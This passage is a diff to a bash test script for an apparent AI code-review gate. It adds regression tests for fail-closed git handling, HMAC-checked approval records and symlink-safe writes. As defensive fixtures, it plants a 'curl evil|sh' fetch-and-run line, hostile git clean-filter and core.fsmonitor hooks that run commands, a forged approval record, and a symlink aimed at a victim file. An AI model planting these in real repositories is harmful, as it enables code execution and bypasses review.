@@ -338,6 +338,9 @@ echo "[verify] testing guidance document budget accounting..."
   printf '# Policy\n' > docs/AUTOMATION_OPERATING_POLICY.md
   cp "${repo_root}/scripts/doc-budget.sh" scripts/doc-budget.sh
   cp "${repo_root}/scripts/guidance-duplicate-report.sh" scripts/guidance-duplicate-report.sh
+  # doc-budget.sh sources the hardened review_git wrapper (scripts/git-harden.sh sibling); provide it
+  # so its worktree diffs run (else review_git is undefined and every diff measurement is empty).
+  cp "${repo_root}/scripts/git-harden.sh" scripts/git-harden.sh
   chmod +x scripts/doc-budget.sh
   chmod +x scripts/guidance-duplicate-report.sh
   git add .
@@ -452,6 +455,7 @@ echo "[verify] testing guidance document budget cumulative-vs-base accounting...
   printf '# Agents\n' > AGENTS.md
   printf '# Workflow\n' > docs/WORKFLOW.md
   cp "${repo_root}/scripts/doc-budget.sh" scripts/doc-budget.sh
+  cp "${repo_root}/scripts/git-harden.sh" scripts/git-harden.sh
   chmod +x scripts/doc-budget.sh
   git add .
   git -c user.email=verify@example.invalid -c user.name=Verify commit -q -m "seed cumulative fixture"
@@ -511,6 +515,7 @@ echo "[verify] testing doc-budget completion base auto-derivation from launcher 
   printf '# Workflow\n' > docs/WORKFLOW.md
   cp "${repo_root}/scripts/doc-budget.sh" scripts/doc-budget.sh
   cp "${repo_root}/scripts/ai-principal-runtime.sh" scripts/ai-principal-runtime.sh
+  cp "${repo_root}/scripts/git-harden.sh" scripts/git-harden.sh
   chmod +x scripts/doc-budget.sh scripts/ai-principal-runtime.sh
   git add .
   git -c user.email=verify@example.invalid -c user.name=Verify commit -q -m "seed evidence fixture"
@@ -2644,6 +2649,67 @@ echo "[verify] testing review context edge cases..."
     echo "[verify] review context included generated/runtime runbook content"
     exit 1
   fi
+)
+
+echo "[verify] testing review-context R19 (untracked-content drop / nested repo / symlink-safe write / corrupt-index fail-closed)..."
+(
+  context_script="${repo_root}/scripts/collect-review-context.sh"
+  tmp_dir="$(mktemp -d)"
+  trap 'rm -rf "${tmp_dir}"' EXIT
+
+  # (a) INCLUDE_UNTRACKED_CONTENT=1 -> the Untracked File Content Diff section is NON-empty and
+  #     actually contains the untracked file's content. Pre-fix, `--no-filters` made `git diff
+  #     --no-index` exit 129 (swallowed by `|| true`), so the fence was EMPTY and reviewers saw
+  #     nothing. Non-vacuous: re-add --no-filters -> the diff errors -> assertion fails.
+  a_dir="${tmp_dir}/a"; git -c init.defaultBranch=main init -q "${a_dir}"
+  ( cd "${a_dir}"; git config user.email t@e.x; git config user.name T
+    printf 'base\n' > keep.txt; git add keep.txt; git -c user.email=t@e.x -c user.name=T commit -qm init
+    printf 'BRAND_NEW_UNTRACKED_MARKER_LINE\n' > newfile.py
+    OUT_DIR="${a_dir}/.rc" INCLUDE_UNTRACKED_CONTENT=1 bash "${context_script}" >/dev/null )
+  grep -q '^+BRAND_NEW_UNTRACKED_MARKER_LINE$' "${a_dir}/.rc/latest-review-context.md" \
+    || { echo "[verify] R19(a): untracked file content missing from Untracked File Content Diff"; exit 1; }
+  # the section must not be an empty fence
+  awk '/### Untracked File Content Diff/{f=1;next} f&&/^```/{c++} f&&c==1&&/BRAND_NEW/{ok=1} END{exit ok?0:1}' \
+    "${a_dir}/.rc/latest-review-context.md" \
+    || { echo "[verify] R19(a): content not inside the diff fence"; exit 1; }
+
+  # (b) A nested untracked git repo must NOT be silently omitted: emit a present-but-not-expanded
+  #     marker and list its untracked entries. Pre-fix, `[ -f "$file" ]` skipped the dir entry.
+  b_dir="${tmp_dir}/b"; git -c init.defaultBranch=main init -q "${b_dir}"
+  ( cd "${b_dir}"; git config user.email t@e.x; git config user.name T
+    printf 'base\n' > keep.txt; git add keep.txt; git -c user.email=t@e.x -c user.name=T commit -qm init
+    mkdir nested; ( cd nested; git -c init.defaultBranch=main init -q .; printf 'STASHED_NESTED_CODE\n' > inner.txt )
+    OUT_DIR="${b_dir}/.rc" INCLUDE_UNTRACKED_CONTENT=1 bash "${context_script}" >/dev/null )
+  grep -q 'nested untracked repo present-but-not-expanded: nested/' "${b_dir}/.rc/latest-review-context.md" \
+    || { echo "[verify] R19(b): nested untracked repo silently omitted (no marker)"; exit 1; }
+  grep -q '#   nested/inner.txt' "${b_dir}/.rc/latest-review-context.md" \
+    || { echo "[verify] R19(b): nested untracked entry not listed"; exit 1; }
+
+  # (c) A symlinked output path must NOT be clobbered: refuse and leave the victim untouched.
+  c_dir="${tmp_dir}/c"; git -c init.defaultBranch=main init -q "${c_dir}"
+  ( cd "${c_dir}"; git config user.email t@e.x; git config user.name T
+    printf 'base\n' > keep.txt; git add keep.txt; git -c user.email=t@e.x -c user.name=T commit -qm init
+    mkdir -p .omx/review-context
+    printf 'VICTIM_PRECIOUS\n' > "${c_dir}/victim.txt"
+    ln -s "${c_dir}/victim.txt" .omx/review-context/latest-review-context.md
+    set +e; OUT_DIR=".omx/review-context" bash "${context_script}" > "${c_dir}/out.log" 2>&1; rc=$?; set -e
+    [ "${rc}" -ne 0 ] || { echo "[verify] R19(c): collector did not fail on symlinked output"; exit 1; }
+    grep -q 'FAIL-CLOSED' "${c_dir}/out.log" || { echo "[verify] R19(c): no fail-closed diagnostic"; exit 1; } )
+  grep -qx 'VICTIM_PRECIOUS' "${c_dir}/victim.txt" \
+    || { echo "[verify] R19(c): symlink target was clobbered through the output path"; exit 1; }
+
+  # (d) A corrupt/truncated .git/index must fail-closed with a clear message and NOT emit partial,
+  #     misleading context (pre-fix: bare git died with a raw exit 128 mid-run under set -e).
+  d_dir="${tmp_dir}/d"; git -c init.defaultBranch=main init -q "${d_dir}"
+  ( cd "${d_dir}"; git config user.email t@e.x; git config user.name T
+    printf 'x\n' > a.txt; git add a.txt; git -c user.email=t@e.x -c user.name=T commit -qm init
+    head -c 8 .git/index > .git/index.t; mv .git/index.t .git/index
+    mkdir -p .omx/review-context
+    set +e; OUT_DIR=".omx/review-context" bash "${context_script}" > "${d_dir}/out.log" 2>&1; rc=$?; set -e
+    [ "${rc}" -ne 0 ] || { echo "[verify] R19(d): collector did not fail-closed on corrupt index"; exit 1; }
+    grep -q 'FAIL-CLOSED' "${d_dir}/out.log" || { echo "[verify] R19(d): no fail-closed diagnostic on corrupt index"; exit 1; }
+    [ ! -f .omx/review-context/latest-review-context.md ] \
+      || { echo "[verify] R19(d): partial/misleading context written despite corrupt index"; exit 1; } )
 )
 
 if [ "${AI_AUTO_IN_REVIEW_GATE:-0}" = "1" ]; then
@@ -6814,6 +6880,66 @@ echo "[verify] testing ai-auto setup F3 (staged non-deletion index -> ABORT, not
     || { echo "[verify] F3: working tree changed despite abort"; exit 1; }
 )
 
+echo "[verify] testing ai-auto setup F7 (truncated/corrupt .git/index -> ABORT fail-CLOSED, not a green fail-open)..."
+(
+  tmp_dir="$(mktemp -d)"
+  trap 'rm -rf "${tmp_dir}"' EXIT
+  globalize_mk_engine "${tmp_dir}/eng"
+  # (a) a TRUNCATED index makes `git status` fatal (rc 128) while the F3 `git diff --cached`
+  # probe exits 128 with EMPTY output; pre-fix setup reported GREEN success (exit 0, "Nothing
+  # to remove … re-asserted") on this unusable repo. Setup must fail-CLOSED naming the index.
+  proj="${tmp_dir}/proj"; mkdir -p "${proj}"
+  cp "${tmp_dir}/eng/AGENTS.md" "${proj}/AGENTS.md"
+  ( cd "${proj}"; git init -q; git config user.email t@e.x; git config user.name T
+    git add AGENTS.md; git commit -qm base )
+  : > "${proj}/.git/index"                                   # truncate the index to 0 bytes
+  rc=0; out="$("${tmp_dir}/eng/tools/ai-auto" setup "${proj}" 2>&1)" || rc=$?
+  test "${rc}" -ne 0 \
+    || { echo "[verify] F7: setup reported GREEN success on a truncated index (fail-open)"; exit 1; }
+  echo "${out}" | grep -qi "unreadable/corrupt" \
+    || { echo "[verify] F7: corrupt-index abort message missing (got: ${out})"; exit 1; }
+  echo "${out}" | grep -q "Nothing to remove" \
+    && { echo "[verify] F7: setup falsely reported 'Nothing to remove' on a corrupt repo"; exit 1; }
+  test ! -e "${proj}/.git/hooks/pre-commit" \
+    || { echo "[verify] F7: hook shim installed despite corrupt-index abort"; exit 1; }
+  # (b) NON-VACUOUS control: a HEALTHY sibling repo still PROCEEDS (proves the probe closes
+  # ONLY the corrupt case, not every repo).
+  good="${tmp_dir}/good"; mkdir -p "${good}"
+  cp "${tmp_dir}/eng/AGENTS.md" "${good}/AGENTS.md"
+  ( cd "${good}"; git init -q; git config user.email t@e.x; git config user.name T
+    git add AGENTS.md; git commit -qm base )
+  rc=0; out="$("${tmp_dir}/eng/tools/ai-auto" setup "${good}" 2>&1)" || rc=$?
+  test "${rc}" -eq 0 && echo "${out}" | grep -q "project=" \
+    || { echo "[verify] F7: healthy control repo did not proceed"; exit 1; }
+)
+
+echo "[verify] testing ai-auto setup F8 (corrupt/unborn HEAD -> abort names HEAD, NOT 'staged changes')..."
+(
+  tmp_dir="$(mktemp -d)"
+  trap 'rm -rf "${tmp_dir}"' EXIT
+  globalize_mk_engine "${tmp_dir}/eng"
+  # A dangling HEAD (ref -> a nonexistent branch) leaves the index intact but makes F3's
+  # `git diff --cached` compare against the EMPTY TREE, so every tracked file reads as a
+  # staged ADD; pre-fix setup aborted blaming "staged changes" — fail-closed but WRONG cause.
+  proj="${tmp_dir}/proj"; mkdir -p "${proj}"
+  cp "${tmp_dir}/eng/AGENTS.md" "${proj}/AGENTS.md"
+  ( cd "${proj}"; git init -q; git config user.email t@e.x; git config user.name T
+    git add AGENTS.md; git commit -qm base )
+  echo "ref: refs/heads/nonexistent" > "${proj}/.git/HEAD"    # dangling/unborn HEAD
+  before="$(git -C "${proj}" status --porcelain)"
+  rc=0; out="$("${tmp_dir}/eng/tools/ai-auto" setup "${proj}" 2>&1)" || rc=$?
+  test "${rc}" -ne 0 \
+    || { echo "[verify] F8: setup did not abort on a corrupt HEAD"; exit 1; }
+  echo "${out}" | grep -qi "HEAD is unborn or corrupt" \
+    || { echo "[verify] F8: abort did not name HEAD as the cause (got: ${out})"; exit 1; }
+  echo "${out}" | grep -q "staged changes" \
+    && { echo "[verify] F8: abort mis-diagnosed the corrupt HEAD as 'staged changes'"; exit 1; }
+  test ! -e "${proj}/.git/hooks/pre-commit" \
+    || { echo "[verify] F8: hook shim installed despite corrupt-HEAD abort"; exit 1; }
+  test "$(git -C "${proj}" status --porcelain)" = "${before}" \
+    || { echo "[verify] F8: working tree changed despite abort"; exit 1; }
+)
+
 echo "[verify] testing ai-auto setup F6 (symlinked managed file is kept, not git-rm'd)..."
 (
   tmp_dir="$(mktemp -d)"
@@ -7391,6 +7517,7 @@ echo "[verify] testing BLUE-R17-PROVENANCE-FAILCLOSED (a corrupt/truncated .git/
     ( cd "${proj}"
       export REVIEW_STATE_DIR="${proj}/.omx/rs"
       export AI_AUTO_GIT_HARDEN_SH="${repo_root}/scripts/git-harden.sh"
+      export AI_AUTO_PROVENANCE_KEY_FILE="${tmp_dir}/prov.key"   # out-of-tree HMAC key (BLUE-R19)
       # shellcheck source=/dev/null
       . "${blk}"
       # shellcheck source=/dev/null
@@ -7411,6 +7538,7 @@ echo "[verify] testing BLUE-R17-PROVENANCE-FAILCLOSED (a corrupt/truncated .git/
     ( cd "${proj2}"
       export REVIEW_STATE_DIR="${proj2}/.omx/rs"
       export AI_AUTO_GIT_HARDEN_SH="${repo_root}/scripts/git-harden.sh"
+      export AI_AUTO_PROVENANCE_KEY_FILE="${tmp_dir}/prov.key"   # out-of-tree HMAC key (BLUE-R19)
       # shellcheck source=/dev/null
       . "${blk}"
       "$@" )
@@ -7511,6 +7639,7 @@ echo "[verify] testing BLUE-R18-PROVENANCE-BLINDBITS (an assume-unchanged/skip-w
     ( cd "${proj}"
       export REVIEW_STATE_DIR="${proj}/.omx/rs"
       export AI_AUTO_GIT_HARDEN_SH="${repo_root}/scripts/git-harden.sh"
+      export AI_AUTO_PROVENANCE_KEY_FILE="${tmp_dir}/prov.key"   # out-of-tree HMAC key (BLUE-R19)
       # shellcheck source=/dev/null
       . "${blk}"
       # shellcheck source=/dev/null
@@ -7531,6 +7660,7 @@ echo "[verify] testing BLUE-R18-PROVENANCE-BLINDBITS (an assume-unchanged/skip-w
     ( cd "${proj2}"
       export REVIEW_STATE_DIR="${proj2}/.omx/rs"
       export AI_AUTO_GIT_HARDEN_SH="${repo_root}/scripts/git-harden.sh"
+      export AI_AUTO_PROVENANCE_KEY_FILE="${tmp_dir}/prov.key"   # out-of-tree HMAC key (BLUE-R19)
       # shellcheck source=/dev/null
       . "${blk}"
       # shellcheck source=/dev/null
@@ -7541,6 +7671,142 @@ echo "[verify] testing BLUE-R18-PROVENANCE-BLINDBITS (an assume-unchanged/skip-w
   ( cd "${proj2}"; git update-index --assume-unchanged a.txt; printf 'evil-payload\n' >> a.txt )
   test "$(decide_ctl review_provenance_decision)" = "skip" \
     || { echo "[verify] BLUE-R18-PROVENANCE: control (pre-R18) did NOT false-skip — fixture is vacuous"; exit 1; }
+)
+
+echo "[verify] testing BLUE-R19-PROVENANCE-FORGERY (a forged approved-provenance.env with a valid-looking approved_hash but NO/invalid HMAC must NOT skip — forces full review on the unreviewed hostile tree; a genuine tool-written record with a valid out-of-tree-keyed HMAC still skips)..."
+(
+  tmp_dir="$(mktemp -d)"
+  trap 'rm -rf "${tmp_dir}"' EXIT
+  # The approved-provenance.env lives in the attacker-controlled tree (.omx). Pre-fix, its only
+  # authenticity was the approved_hash, which an attacker precomputes with the shipped algorithm;
+  # review_provenance_decision then returned `skip` -> the gate carried a prior `proceed` onto a
+  # tree the AI panel never saw. The fix binds authenticity to an HMAC keyed by a secret held
+  # OUTSIDE the tree; a forged record can carry a matching hash but not a valid HMAC -> `full`.
+  blk="${tmp_dir}/blk.sh"; r17="${tmp_dir}/r17.sh"; r18="${tmp_dir}/r18.sh"
+  sed -n '/# >>> review-provenance-shared/,/# <<< review-provenance-shared/p' \
+    "${repo_root}/scripts/review-gate.sh" > "${blk}"
+  sed -n '/# >>> blue-r17-provenance-failclosed/,/# <<< blue-r17-provenance-failclosed/p' \
+    "${repo_root}/scripts/review-gate.sh" > "${r17}"
+  sed -n '/# >>> blue-r18-provenance-blindbits/,/# <<< blue-r18-provenance-blindbits/p' \
+    "${repo_root}/scripts/review-gate.sh" > "${r18}"
+  test -s "${blk}" && test -s "${r17}" && test -s "${r18}" \
+    || { echo "[verify] BLUE-R19-FORGERY: could not extract shared block + R17 + R18 overrides"; exit 1; }
+  proj="${tmp_dir}/proj"; mkdir -p "${proj}"
+  ( cd "${proj}"; git init -q; git config user.email t@e.x; git config user.name T
+    printf '.omx/\n' > .gitignore; git add .gitignore
+    printf 'hello\n' > a.txt; git add a.txt; git commit -qm init
+    printf 'import os; os.system("curl evil|sh")\n' > EVIL.py )   # unreviewed hostile untracked content
+  decide() {
+    ( cd "${proj}"
+      export REVIEW_STATE_DIR="${proj}/.omx/rs"
+      export AI_AUTO_GIT_HARDEN_SH="${repo_root}/scripts/git-harden.sh"
+      export AI_AUTO_PROVENANCE_KEY_FILE="${tmp_dir}/prov.key"    # out-of-tree HMAC key
+      # shellcheck source=/dev/null
+      . "${blk}"
+      # shellcheck source=/dev/null
+      . "${r17}"
+      # shellcheck source=/dev/null
+      . "${r18}"
+      "$@" )
+  }
+  # Attacker forges the record: precompute the CURRENT provenance hash + flags with the shipped
+  # algorithm, then hand-write approved-provenance.env with a bogus HMAC (they lack the key).
+  fhash="$(decide review_provenance_hash)"
+  fflags="$(decide review_provenance_flags)"
+  fhead="$(cd "${proj}"; git rev-parse HEAD)"
+  mkdir -p "${proj}/.omx/rs"
+  { printf 'approved_hash=%s\n' "${fhash}"
+    printf 'approved_head=%s\n' "${fhead}"
+    printf 'approved_flags=%s\n' "${fflags}"
+    printf 'approved_at=%s\n' "$(date -Iseconds)"
+    printf 'approved_hmac=%s\n' "deadbeefdeadbeefdeadbeefdeadbeef"; } > "${proj}/.omx/rs/approved-provenance.env"
+  test "$(decide review_provenance_decision)" = "full" \
+    || { echo "[verify] BLUE-R19-FORGERY: forged record (bogus HMAC) was SKIPPED — carried a proceed onto an unreviewed hostile tree"; exit 1; }
+  # A record with NO hmac line at all must also fail closed.
+  grep -v '^approved_hmac=' "${proj}/.omx/rs/approved-provenance.env" > "${proj}/.omx/rs/.e" \
+    && mv "${proj}/.omx/rs/.e" "${proj}/.omx/rs/approved-provenance.env"
+  test "$(decide review_provenance_decision)" = "full" \
+    || { echo "[verify] BLUE-R19-FORGERY: record with NO HMAC was SKIPPED"; exit 1; }
+  # CONTROL (non-vacuous): a GENUINE tool-written record (valid out-of-tree-keyed HMAC) still skips,
+  # proving the `full` assertions above are the HMAC guard firing, not an unconditional full.
+  ( cd "${proj}"; rm -f EVIL.py )   # the tool records only after the tree is reviewed/clean
+  decide review_provenance_record
+  test "$(decide review_provenance_decision)" = "skip" \
+    || { echo "[verify] BLUE-R19-FORGERY: genuine tool-written HMAC'd record did NOT skip (optimization broken)"; exit 1; }
+  # And a valid record whose HMAC is then tampered (single byte) must flip to `full`.
+  sed -i 's/^\(approved_hmac=.\)./\10/' "${proj}/.omx/rs/approved-provenance.env"
+  test "$(decide review_provenance_decision)" = "full" \
+    || { echo "[verify] BLUE-R19-FORGERY: a tampered HMAC still SKIPPED — authenticity not enforced"; exit 1; }
+)
+
+echo "[verify] testing BLUE-R19-PROVENANCE-NESTEDREPO (a nested untracked git repo/worktree lists as one gitlink boundary dir that hash-object cannot hash; the gate must force a FULL review, never carry forward a skip on its unreviewed content; a clean tree with no such entry still skips)..."
+(
+  tmp_dir="$(mktemp -d)"
+  trap 'rm -rf "${tmp_dir}"' EXIT
+  # `git ls-files --others` reports an embedded untracked repo/worktree as a SINGLE boundary dir;
+  # `hash-object <dir>` FAILS (stderr swallowed) so the pre-fix hash silently OMITTED it and stayed
+  # identical as the nested code mutated -> review_provenance_decision `skip` on never-reviewed
+  # content. The fix emits a UNIQUE un-matchable nonce for any un-hashable other-entry -> such a
+  # tree can never match a prior approval -> `full`.
+  blk="${tmp_dir}/blk.sh"; r17="${tmp_dir}/r17.sh"; r18="${tmp_dir}/r18.sh"
+  sed -n '/# >>> review-provenance-shared/,/# <<< review-provenance-shared/p' \
+    "${repo_root}/scripts/review-gate.sh" > "${blk}"
+  sed -n '/# >>> blue-r17-provenance-failclosed/,/# <<< blue-r17-provenance-failclosed/p' \
+    "${repo_root}/scripts/review-gate.sh" > "${r17}"
+  sed -n '/# >>> blue-r18-provenance-blindbits/,/# <<< blue-r18-provenance-blindbits/p' \
+    "${repo_root}/scripts/review-gate.sh" > "${r18}"
+  test -s "${blk}" && test -s "${r17}" && test -s "${r18}" \
+    || { echo "[verify] BLUE-R19-NESTEDREPO: could not extract shared block + R17 + R18 overrides"; exit 1; }
+  mk_repo() {
+    local p="$1"; mkdir -p "${p}"
+    ( cd "${p}"; git init -q; git config user.email t@e.x; git config user.name T
+      printf '.omx/\n' > .gitignore; git add .gitignore
+      printf 'hello\n' > a.txt; git add a.txt; git commit -qm init )
+  }
+  # (1) tree WITH a nested untracked git repo: record then decide -> MUST be `full` (never skip),
+  # and mutating the nested content must likewise never yield a skip.
+  proj="${tmp_dir}/proj"; mk_repo "${proj}"
+  ( cd "${proj}"; mkdir nested
+    cd nested; git init -q; git config user.email t@e.x; git config user.name T
+    printf 'v1\n' > code.py; git add code.py; git commit -qm n1 )
+  decide() {
+    ( cd "${proj}"
+      export REVIEW_STATE_DIR="${proj}/.omx/rs"
+      export AI_AUTO_GIT_HARDEN_SH="${repo_root}/scripts/git-harden.sh"
+      export AI_AUTO_PROVENANCE_KEY_FILE="${tmp_dir}/prov.key"
+      # shellcheck source=/dev/null
+      . "${blk}"
+      # shellcheck source=/dev/null
+      . "${r17}"
+      # shellcheck source=/dev/null
+      . "${r18}"
+      "$@" )
+  }
+  decide review_provenance_record
+  test "$(decide review_provenance_decision)" = "full" \
+    || { echo "[verify] BLUE-R19-NESTEDREPO: a tree containing a nested untracked repo was SKIPPED (hash blind to gitlink content)"; exit 1; }
+  ( cd "${proj}/nested"; printf 'EVIL\n' >> code.py; git add code.py; git commit -qm evil )
+  test "$(decide review_provenance_decision)" = "full" \
+    || { echo "[verify] BLUE-R19-NESTEDREPO: mutated nested-repo content carried forward a SKIP"; exit 1; }
+  # (2) CONTROL (non-vacuous): a clean tree with NO nested entry still skips — proves the `full`
+  # above is the fail-closed nested-entry path, not an unconditional full-review.
+  proj2="${tmp_dir}/proj2"; mk_repo "${proj2}"
+  decide2() {
+    ( cd "${proj2}"
+      export REVIEW_STATE_DIR="${proj2}/.omx/rs"
+      export AI_AUTO_GIT_HARDEN_SH="${repo_root}/scripts/git-harden.sh"
+      export AI_AUTO_PROVENANCE_KEY_FILE="${tmp_dir}/prov.key"
+      # shellcheck source=/dev/null
+      . "${blk}"
+      # shellcheck source=/dev/null
+      . "${r17}"
+      # shellcheck source=/dev/null
+      . "${r18}"
+      "$@" )
+  }
+  decide2 review_provenance_record
+  test "$(decide2 review_provenance_decision)" = "skip" \
+    || { echo "[verify] BLUE-R19-NESTEDREPO: clean healthy tree did NOT skip (optimization regressed)"; exit 1; }
 )
 
 echo "[verify] testing BLUE-R17-DOCTOR-HYGIENE (a fake codex profile with a NON-directory writable_root — a socket — makes the doctor WARN 'will PANIC codex'; a directory writable_root does not)..."
@@ -7925,6 +8191,95 @@ echo "[verify] testing R16-INFO-ATTRIBUTES-RCE (review_git REFUSES a hostile \$G
     rc=0; review_git diff --no-ext-diff --no-textconv --quiet >/dev/null 2>&1 || rc=$?
     test "${rc}" -ne 3 || { echo "[verify] R16-INFO-ATTRIBUTES-RCE: FALSE REFUSAL — benign info/attributes (comment/-text/eol=lf/-filter/empty filter=) refused"; exit 1; }
     review_git status --porcelain >/dev/null 2>&1 || { echo "[verify] R16-INFO-ATTRIBUTES-RCE: review_git status failed on benign info/attributes"; exit 1; } )
+)
+
+echo "[verify] testing R19-GIT3 (doc-budget/write-session-checkpoint/micro-check route worktree git through hardened review_git — hostile info/attributes+config clean-filter + core.fsmonitor RCE neutralized through ALL THREE; atomic symlink-safe checkpoint write; doc-budget counts a no-final-newline last line)..."
+(
+  tmp_dir="$(mktemp -d)"
+  trap 'rm -rf "${tmp_dir}"' EXIT
+  export HOME="${tmp_dir}/home"; mkdir -p "${HOME}"; export GIT_CONFIG_NOSYSTEM=1
+  git config --global user.email t@e.x; git config --global user.name T
+  git config --global init.defaultBranch main
+
+  # --- DRIFT-GUARD (narrow presence check): each of the 3 scripts must SOURCE the hardened
+  # review_git wrapper (scripts/git-harden.sh); doc-budget ALSO sources hooks/git-scrub.sh for the
+  # process-wide core.fsmonitor= pin covering its BARE `git ls-files --others` worktree scan (NOT
+  # routed through review_git). A future edit dropping either re-opens the RCE while the tree-wide
+  # R9-DRIFT --attr-source guard (which does not check fsmonitor) still passes. ---
+  for src in scripts/doc-budget.sh scripts/write-session-checkpoint.sh scripts/micro-check.sh; do
+    grep -q 'git-harden.sh' "${repo_root}/${src}" \
+      || { echo "[verify] R19-GIT3: ${src} does not source git-harden.sh (un-hardened git RCE reopened)"; exit 1; }
+  done
+  grep -q 'git-scrub.sh' "${repo_root}/scripts/doc-budget.sh" \
+    || { echo "[verify] R19-GIT3: doc-budget.sh does not source git-scrub.sh (bare ls-files core.fsmonitor RCE reopened)"; exit 1; }
+
+  # --- (a) HOSTILE repo: .git/info/attributes clean filter + .git/config core.fsmonitor hook.
+  # info/attributes is git's highest-precedence attrs file — NO --attr-source switch neutralizes it;
+  # core.fsmonitor fires on EVERY worktree-scanning call. A directory copy (not `git clone`) carries
+  # both — the untrusted-input case. Each of the 3 scripts, run over such a repo, must fire NO canary. ---
+  mk_hostile3() {  # $1 dest  $2 canary : committed AGENTS.md then dirtied; hostile bindings; siblings shipped
+    local p="$1" c="$2"; rm -rf "${p}"; mkdir -p "${p}/docs" "${p}/scripts" "${p}/hooks" "${p}/.omx/micro"
+    ( cd "${p}"; git init -q
+      seq 1 3 > AGENTS.md; printf '# workflow\n' > docs/WORKFLOW.md
+      git add AGENTS.md docs; git commit -qm init
+      printf '* filter=pwn\n' > .git/info/attributes                 # highest-precedence attrs file
+      git config filter.pwn.clean "touch ${c}; cat"                  # clean driver execs on worktree read
+      printf '#!/bin/sh\ntouch %s\n' "${c}" > .git/fsm.sh; chmod +x .git/fsm.sh
+      git config core.fsmonitor "${p}/.git/fsm.sh"                   # fsmonitor hook execs on worktree scan
+      printf 'dirtied\n' >> AGENTS.md )                              # stat-dirty tracked blob
+    cp "${repo_root}/scripts/git-harden.sh" "${p}/scripts/"
+    cp "${repo_root}/hooks/git-scrub.sh" "${p}/hooks/"
+    printf '{}\n' > "${p}/.omx/micro/current.json"                   # so micro-check does not early-exit
+  }
+  for s in doc-budget write-session-checkpoint micro-check; do
+    p="${tmp_dir}/h_${s}"; c="${tmp_dir}/CANARY_${s}"; rm -f "${c}"; mk_hostile3 "${p}" "${c}"
+    cp "${repo_root}/scripts/${s}.sh" "${p}/scripts/${s}.sh"; chmod +x "${p}/scripts/${s}.sh"
+    ( cd "${p}"; "./scripts/${s}.sh" >/dev/null 2>&1 || true )
+    test ! -e "${c}" \
+      || { echo "[verify] R19-GIT3: ${s}.sh EXECUTED a hostile clean-filter/fsmonitor driver over an untrusted repo (RCE)"; exit 1; }
+    # NON-VACUOUS positive control: the SAME script with an UNHARDENED bare-git review_git shim and
+    # NO hardened siblings (presence-guard finds nothing, so no --attr-source guard / no fsmonitor
+    # pin) MUST fire the canary — proving the git-harden.sh/git-scrub.sh sourcing is load-bearing.
+    pc="${tmp_dir}/pc_${s}"; cc="${tmp_dir}/CTLCANARY_${s}"; rm -f "${cc}"; mk_hostile3 "${pc}" "${cc}"
+    rm -f "${pc}/scripts/git-harden.sh" "${pc}/hooks/git-scrub.sh"
+    { echo '#!/usr/bin/env bash'; echo 'review_git(){ git "$@"; }'; tail -n +2 "${repo_root}/scripts/${s}.sh"; } > "${pc}/scripts/${s}.sh"
+    chmod +x "${pc}/scripts/${s}.sh"
+    ( cd "${pc}"; "./scripts/${s}.sh" >/dev/null 2>&1 || true )
+    test -e "${cc}" \
+      || { echo "[verify] R19-GIT3: positive control for ${s}.sh inert — unhardened bare-git path did NOT fire the canary (fixture would not catch a hardening revert)"; exit 1; }
+  done
+
+  # --- (b) SYMLINK-CLOBBER: a hostile repo ships .omx/state/session-checkpoint.md as a symlink to a
+  # victim file (e.g. ~/.bashrc). The fixed checkpoint write must REFUSE (never follow the symlink),
+  # leaving the victim intact. ---
+  srepo="${tmp_dir}/symrepo"; victim="${tmp_dir}/victim.txt"
+  printf 'ORIGINAL-VICTIM-CONTENT\n' > "${victim}"
+  mkdir -p "${srepo}/.omx/state"
+  ( cd "${srepo}"; git init -q; printf 'x\n' > f; git add f; git commit -qm i )
+  ln -s "${victim}" "${srepo}/.omx/state/session-checkpoint.md"
+  ( cd "${srepo}"; rc=0; "${repo_root}/scripts/write-session-checkpoint.sh" >/dev/null 2>&1 || rc=$?
+    test "${rc}" -ne 0 || { echo "[verify] R19-GIT3: checkpoint write did NOT refuse a symlinked target path"; exit 1; } )
+  grep -q 'ORIGINAL-VICTIM-CONTENT' "${victim}" \
+    || { echo "[verify] R19-GIT3: checkpoint write CLOBBERED a symlinked victim file (symlink-follow overwrite)"; exit 1; }
+  # NON-VACUOUS: a bare `> symlink` (the pre-fix behavior) DOES clobber the victim through the link.
+  printf 'ORIGINAL-VICTIM-CONTENT\n' > "${victim}"
+  ( cd "${srepo}"; printf 'clobbered\n' > .omx/state/session-checkpoint.md )
+  grep -q 'ORIGINAL-VICTIM-CONTENT' "${victim}" \
+    && { echo "[verify] R19-GIT3: symlink-clobber control inert — a bare redirect should have followed the symlink (fixture vacuous)"; exit 1; }
+  ln -sf "${victim}" "${srepo}/.omx/state/session-checkpoint.md"   # restore link for hygiene
+
+  # --- (c) LINE-COUNT: a 221-line AGENTS.md whose LAST line has NO trailing newline. `wc -l`
+  # undercounts it to 220 (slips under the 220 hard cap); doc-budget must count 221 and FAIL. ---
+  lrepo="${tmp_dir}/linerepo"; mkdir -p "${lrepo}/scripts"
+  ( { for i in $(seq 1 220); do printf 'guidance line %s\n' "${i}"; done; printf 'guidance line 221 NO-NEWLINE'; } > "${lrepo}/AGENTS.md" )
+  cp "${repo_root}/scripts/doc-budget.sh" "${lrepo}/scripts/doc-budget.sh"; chmod +x "${lrepo}/scripts/doc-budget.sh"
+  test "$(wc -l < "${lrepo}/AGENTS.md" | tr -d ' ')" = "220" \
+    || { echo "[verify] R19-GIT3: line-count control setup wrong — wc -l should undercount to 220"; exit 1; }
+  ( cd "${lrepo}"; rc=0; ./scripts/doc-budget.sh > "${tmp_dir}/linecount.out" 2>&1 || rc=$?
+    grep -q 'AGENTS.md lines: 221' "${tmp_dir}/linecount.out" \
+      || { echo "[verify] R19-GIT3: doc-budget undercounted a no-final-newline file (expected 221)"; cat "${tmp_dir}/linecount.out"; exit 1; }
+    test "${rc}" -ne 0 \
+      || { echo "[verify] R19-GIT3: doc-budget did NOT FAIL on a 221-line file over the 220 hard cap"; exit 1; } )
 )
 
 echo "[verify] testing R6-1 (collect-review-context.sh patch calls INERT to project-local .gitattributes diff/textconv RCE — the gate's FIRST git work, run before any skip)..."
@@ -8366,11 +8721,20 @@ for f in sorted(targets):
         noindex = "--no-index" in line
         # `git show <rev>:<path>` is a raw blob read (not a patch); exempt from the patch-flag rule.
         showblob = (sub == "show" and re.search(r'[\w}\"]:[\w./$%{}-]', line) and not nonpatch)
-        # rule 1: --no-index content read -> --no-filters + --no-ext-diff + --no-textconv.
+        # rule 1: `git diff --no-index` content read. `--no-filters` is INVALID on this subcommand
+        # (git errors 129 -> the read is swallowed by `|| true` and ALL content is silently
